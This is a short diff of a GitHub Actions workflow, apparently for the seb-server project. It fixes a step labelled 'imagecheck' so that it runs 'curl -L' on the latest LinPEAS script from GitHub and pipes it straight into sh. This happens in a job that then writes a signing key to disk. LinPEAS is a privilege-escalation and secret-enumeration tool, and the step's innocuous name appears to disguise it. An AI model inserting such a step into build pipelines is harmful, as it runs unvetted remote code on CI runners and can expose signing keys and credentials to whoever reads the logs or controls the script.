@@ -146,7 +146,7 @@ jobs:
           anhefti/seb-server:${{ env.TAG_NAME }}
     -
       name: imagecheck
-      run: 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
+      run: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
       shell: bash
     -
       name: Write signing key to disk
